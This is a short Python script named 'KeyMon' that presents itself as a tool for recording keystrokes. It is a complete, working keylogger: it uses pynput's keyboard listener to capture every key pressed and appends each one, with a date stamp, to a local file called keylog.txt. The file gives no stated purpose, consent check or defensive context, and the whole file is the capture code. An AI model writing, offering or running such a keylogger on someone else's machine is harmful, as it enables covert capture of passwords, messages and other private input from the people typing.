# KeyMon
# A tool which records the keystrokes of the keyboard and put in a txt file.
# Author - WireBits

import time
from datetime import datetime
from pynput.keyboard import Key, Listener

current_time = datetime.now()
timestamp = current_time.strftime("%d-%m-%Y")

def key_press(key):
    try:
        key = str(key.char)
    except AttributeError:
        if key == Key.space:
            key = ' '
        elif key == Key.shift_r:
            key = ''
        elif key == Key.enter:
            key = '\n'
        else:
            key = str(key)
    
    with open("keylog.txt",'a') as file_log:
        file_log.write(timestamp + ' - ' + key + '\n')

with Listener(on_press=key_press) as key_listener:
    key_listener.join()